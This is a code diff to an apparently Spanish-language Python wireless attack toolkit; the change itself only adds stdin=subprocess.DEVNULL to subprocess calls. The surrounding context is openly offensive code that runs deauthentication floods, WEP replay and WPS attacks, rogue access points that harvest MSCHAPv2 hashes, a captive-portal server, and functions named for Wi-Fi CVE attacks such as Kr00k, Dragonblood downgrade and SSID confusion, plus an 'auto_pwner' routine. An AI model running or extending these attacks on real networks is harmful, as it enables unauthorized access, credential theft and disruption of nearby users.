@@ -365,7 +365,8 @@ def quick_scan(interfaz, segundos=15):
             f"timeout --kill-after=5 {segundos} airodump-ng --write {out_base} --output-format csv {interfaz}",
             shell=True, capture_output=True,
             timeout=segundos + 10
-        )
+        ,
+            stdin=subprocess.DEVNULL)
     except Exception:
         pass
     sp.stop()
@@ -848,7 +849,8 @@ def modo_wizard():
             subprocess.run(
                 f"aireplay-ng -3 -b {bssid} -h {mon_iface} {mon_iface}",
                 shell=True, timeout=90, capture_output=True
-            )
+            ,
+                stdin=subprocess.DEVNULL)
         except Exception:
             pass
         sp_wep.stop()
@@ -925,7 +927,8 @@ def modo_wizard():
             warn("Los hashes MSCHAPv2 aparecerán si hay clientes vulnerables.")
 
             try:
-                subprocess.run([_wpe_tool, _wpe_conf], timeout=120)
+                subprocess.run([_wpe_tool, _wpe_conf], timeout=120,
+                    stdin=subprocess.DEVNULL)
             except (KeyboardInterrupt, subprocess.TimeoutExpired):
                 pass
             _wpe_stop.set()
@@ -1070,7 +1073,8 @@ def modo_wizard():
                 _cap_kr_p = subprocess.Popen(
                     f"tcpdump -i {mon_iface} -w {_cap_kr} type data 2>/dev/null",
                     shell=True
-                )
+                ,
+                    stdin=subprocess.DEVNULL)
                 time.sleep(2)
                 for _ in range(5):
                     run(f"aireplay-ng -0 3 -a {bssid} {mon_iface} 2>/dev/null", capture=True)
@@ -1802,7 +1806,8 @@ def wps_attack():
             warn("Escaneando WPS durante 15 segundos... CTRL+C para parar.")
             time.sleep(1)
             try:
-                subprocess.run(f"timeout 15 wash -i {interfaz}", shell=True)
+                subprocess.run(f"timeout 15 wash -i {interfaz}", shell=True,
+                    stdin=subprocess.DEVNULL)
             except Exception:
                 pass
 
@@ -3160,7 +3165,8 @@ def probe_harvester():
         run(f"rm -f {base}-01.csv 2>/dev/null")
         try:
             subprocess.run(f"timeout {t} airodump-ng --write {base} --output-format csv {interfaz}",
-                           shell=True, capture_output=True)
+                           shell=True, capture_output=True,
+                               stdin=subprocess.DEVNULL)
         except Exception:
             pass
         csv_f = f"{base}-01.csv"
@@ -3368,7 +3374,8 @@ HTTPServer(("192.168.20.1",80),H).serve_forever()
         if check_tool("mdk4"):
             subprocess.Popen(f"mdk4 {iface_ap} p 2>/dev/null", shell=True,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["python3", server_script])
+        subprocess.run(["python3", server_script],
+            stdin=subprocess.DEVNULL)
     except KeyboardInterrupt:
         pass
     finally:
@@ -3469,7 +3476,8 @@ wpe_logfile={log_file}
     db_log_attack("WPA Enterprise", essid, "-", channel, "activo", log_file)
 
     try:
-        subprocess.run([tool, wpe_conf])
+        subprocess.run([tool, wpe_conf],
+            stdin=subprocess.DEVNULL)
     except KeyboardInterrupt:
         pass
     finally:
@@ -3546,7 +3554,8 @@ def wep_full_attack():
         subprocess.run(
             f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
             shell=True, timeout=120
-        )
+        ,
+            stdin=subprocess.DEVNULL)
     except (KeyboardInterrupt, subprocess.TimeoutExpired):
         pass
 
@@ -4575,7 +4584,8 @@ def auto_pwner():
             time.sleep(3)
             try:
                 subprocess.run(f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
-                               shell=True, timeout=60)
+                               shell=True, timeout=60,
+                                   stdin=subprocess.DEVNULL)
             except (subprocess.TimeoutExpired, KeyboardInterrupt):
                 pass
             cap_p.terminate(); time.sleep(2)
@@ -4668,7 +4678,8 @@ def auto_pwner():
             cap_p = subprocess.Popen(
                 f"xterm -title 'Auto-Capture {essid}' -e "
                 f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}'",
-                shell=True)
+                shell=True,
+                    stdin=subprocess.DEVNULL)
             time.sleep(6)
             run(f"aireplay-ng -0 20 -a {bssid} {interfaz} 2>/dev/null")
             time.sleep(5)
@@ -4929,7 +4940,8 @@ bssid={bssid}
         tip("Los clientes que tengan guardada esa red se conectarán automáticamente.")
         try:
             subprocess.run(["hostapd", "/tmp/herradura_ssid_conf/hostapd.conf"],
-                           timeout=120)
+                           timeout=120,
+                               stdin=subprocess.DEVNULL)
         except (KeyboardInterrupt, subprocess.TimeoutExpired):
             pass
         run("pkill hostapd 2>/dev/null")
@@ -5353,7 +5365,8 @@ def _cve_kr00k():
     cap_proc = subprocess.Popen(
         f"tcpdump -i {interfaz} -w {cap_file} 'type data' 2>/dev/null",
         shell=True
-    )
+    ,
+        stdin=subprocess.DEVNULL)
     time.sleep(2)
 
     info("Enviando disassociaciones para activar Kr00k...")
@@ -5615,7 +5628,8 @@ wpe_logfile={eap_log}
     db_log_attack("CVE-2023-52160 EAP Bypass", essid, "-", channel, "activo")
 
     try:
-        subprocess.run([wpe_tool, conf])
+        subprocess.run([wpe_tool, conf],
+            stdin=subprocess.DEVNULL)
     except KeyboardInterrupt:
         pass
     finally:
@@ -5702,7 +5716,8 @@ def _cve_ssid_confusion_plus():
         warn("CTRL+C para detener.")
         db_log_attack("SSID Confusion CVE-2023-52424", essid_victima, bssid_real, channel, "activo")
         try:
-            subprocess.run(["hostapd", "/tmp/herradura_ssidconf/hostapd.conf"])
+            subprocess.run(["hostapd", "/tmp/herradura_ssidconf/hostapd.conf"],
+                stdin=subprocess.DEVNULL)
         except KeyboardInterrupt:
             pass
         run("pkill hostapd 2>/dev/null")
@@ -5833,7 +5848,8 @@ def _cve_dragonblood_plus():
         warn("CTRL+C para detener.")
         db_log_attack("Dragonblood Downgrade", essid, bssid, channel, "activo")
         try:
-            subprocess.run(["hostapd","/tmp/herradura_dragondown/hostapd.conf"])
+            subprocess.run(["hostapd","/tmp/herradura_dragondown/hostapd.conf"],
+                stdin=subprocess.DEVNULL)
         except KeyboardInterrupt:
             pass
         run("pkill hostapd 2>/dev/null")
@@ -5860,7 +5876,8 @@ def _cve_kr00k_pmkid_chain():
 
     step(1,"Kr00k: disassoc + captura con clave nula")
     cap_f  = f"kr00k/{essid_s}_chain.pcap"
-    cap_p  = subprocess.Popen(f"tcpdump -i {interfaz} -w {cap_f} 2>/dev/null", shell=True)
+    cap_p  = subprocess.Popen(f"tcpdump -i {interfaz} -w {cap_f} 2>/dev/null", shell=True,
+        stdin=subprocess.DEVNULL)
     time.sleep(2)
     for _ in range(6):
         run(f"aireplay-ng -0 2 -a {bssid} {interfaz} 2>/dev/null")
